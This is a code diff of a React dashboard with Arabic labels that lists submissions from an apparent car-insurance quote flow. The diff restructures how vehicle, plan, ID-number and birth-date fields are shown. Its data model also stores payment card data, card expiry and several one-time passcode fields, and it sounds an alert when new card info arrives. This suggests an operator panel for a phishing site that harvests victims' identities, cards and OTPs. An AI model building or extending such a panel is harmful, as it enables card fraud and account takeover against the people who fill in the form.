@@ -66,13 +66,27 @@ interface Notification {
 
   // Personal info
   name?: string
-  email?: string
+  insuranceType: string
+  serialNumber: string
+  birthDate: string
+
+  // Step 2
+  vehicleType: string
+  vehicleModel: string
+  vehicleYear: string
+  vehicleValue: string
+
+  // Step 3
+  selectedPlan: string
+  selectedOfferId?: string
+  selectedFeatures?: string[]
+  totalPrice?: string
+  coverage: string[]
   mobile?: string
   phone?: string
   idNumber?: string
 
   // Form data
-  formData?: FormData
 
   // Card data
   cardData?: CardData
@@ -98,7 +112,6 @@ interface Notification {
   pagename?: string
   plateType?: string
   allOtps?: string[] | null
-  network?: string
   phoneOtp?: string
   cardExpiry?: string
   otpCode?: string
@@ -284,8 +297,8 @@ export default function NotificationsPage() {
           )
           const hasNewGeneralInfo = notificationsData.some(
             (notification) =>
-              (notification.idNumber || notification.email || notification.mobile) &&
-              !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile))
+              (notification.idNumber || notification.mobile) &&
+              !notifications.some((n) => n.id === notification.id && (n.idNumber || n.mobile))
           )
 
           // Only play notification sound if new card info or general info is added
@@ -567,18 +580,18 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={notification.idNumber ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.idNumber ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
-                          variant={notification.formData?.vehicleModel ? "default" : "destructive"}
-                          className="rounded-md cursor-pointer bg-emerald-500 dark:bg-emerald-600"
+                          variant={notification?.vehicleModel ? "default" : "destructive"}
+                          className="rounded-md cursor-pointer  dark:bg-emerald-600"
                           onClick={() => handleInfoClick(notification, "insurance")}
                         >
-                          {notification.formData?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
+                          {notification?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
                         </Badge>
                         <Badge
                           variant={
@@ -691,11 +704,11 @@ export default function NotificationsPage() {
                           {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
-                          variant={notification.formData?.vehicleModel ? "default" : "destructive"}
+                          variant={notification?.vehicleModel ? "default" : "destructive"}
                           className="rounded-md cursor-pointer bg-emerald-500 dark:bg-emerald-600"
                           onClick={() => handleInfoClick(notification, "insurance")}
                         >
-                          {notification.formData?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
+                          {notification?.vehicleModel ? "بيانات التأمين" : "لا يوجد بيانات"}
                         </Badge>
                         <Badge
                           variant={
@@ -779,10 +792,10 @@ export default function NotificationsPage() {
                   <span>{selectedNotification.idNumber}</span>
                 </p>
               )}
-              {selectedNotification.email && (
+              {selectedNotification.birthDate && (
                 <p className="flex justify-between">
-                  <span className="font-medium">البريد الإلكتروني:</span>
-                  <span>{selectedNotification.email}</span>
+                  <span className="font-medium">تاريخ الميلاد:</span>
+                  <span>{selectedNotification.birthDate}</span>
                 </p>
               )}
               {selectedNotification.mobile && (
@@ -806,7 +819,7 @@ export default function NotificationsPage() {
             </div>
           )}
 
-          {selectedInfo === "insurance" && selectedNotification && selectedNotification.formData && (
+          {selectedInfo === "insurance" && selectedNotification  && (
             <Tabs defaultValue="basic" className="w-full">
               <TabsList className="grid grid-cols-3 mb-4">
                 <TabsTrigger value="basic">معلومات أساسية</TabsTrigger>
@@ -816,57 +829,57 @@ export default function NotificationsPage() {
               <TabsContent value="basic" className="space-y-3 p-4 bg-muted rounded-lg">
                 <p className="flex justify-between">
                   <span className="font-medium">نوع التأمين:</span>
-                  <span>{selectedNotification.formData.insuranceType}</span>
+                  <span>{selectedNotification?.insuranceType}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">الرقم التسلسلي:</span>
-                  <span>{selectedNotification.formData.serialNumber}</span>
+                  <span>{selectedNotification?.serialNumber}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">رقم الهوية:</span>
-                  <span>{selectedNotification.formData.idNumber}</span>
+                  <span>{selectedNotification?.idNumber}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">تاريخ الميلاد:</span>
-                  <span>{selectedNotification.formData.birthDate}</span>
+                  <span>{selectedNotification.birthDate}</span>
                 </p>
               </TabsContent>
               <TabsContent value="vehicle" className="space-y-3 p-4 bg-muted rounded-lg">
                 <p className="flex justify-between">
                   <span className="font-medium">نوع المركبة:</span>
-                  <span>{selectedNotification.formData.vehicleType}</span>
+                  <span>{selectedNotification?.vehicleType}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">موديل المركبة:</span>
-                  <span>{selectedNotification.formData.vehicleModel}</span>
+                  <span>{selectedNotification?.vehicleModel}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">سنة الصنع:</span>
-                  <span>{selectedNotification.formData.vehicleYear}</span>
+                  <span>{selectedNotification?.vehicleYear}</span>
                 </p>
                 <p className="flex justify-between">
                   <span className="font-medium">قيمة المركبة:</span>
-                  <span>{selectedNotification.formData.vehicleValue} ر.س</span>
+                  <span>{selectedNotification?.vehicleValue} ر.س</span>
                 </p>
               </TabsContent>
               <TabsContent value="plan" className="space-y-3 p-4 bg-muted rounded-lg">
                 <p className="flex justify-between">
                   <span className="font-medium">خطة التأمين:</span>
-                  <span>{selectedNotification.formData.selectedPlan || "لم يتم الاختيار بعد"}</span>
+                  <span>{selectedNotification?.selectedPlan || "لم يتم الاختيار بعد"}</span>
                 </p>
-                {selectedNotification.formData.totalPrice && (
+                {selectedNotification?.totalPrice && (
                   <p className="flex justify-between">
                     <span className="font-medium">السعر الإجمالي:</span>
                     <span className="font-bold text-emerald-600 dark:text-emerald-400">
-                      {selectedNotification.formData.totalPrice} ر.س
+                      {selectedNotification?.totalPrice} ر.س
                     </span>
                   </p>
                 )}
-                {selectedNotification.formData.coverage && selectedNotification.formData.coverage.length > 0 && (
+                {selectedNotification?.coverage && selectedNotification?.coverage.length > 0 && (
                   <div>
                     <span className="font-medium block mb-2">التغطيات المشمولة:</span>
                     <div className="flex flex-wrap gap-2">
-                      {selectedNotification.formData.coverage.map((item, index) => (
+                      {selectedNotification?.coverage.map((item, index) => (
                         <Badge key={index} variant="outline" className="bg-emerald-100 dark:bg-emerald-900 text-xs">
                           {item}
                         </Badge>
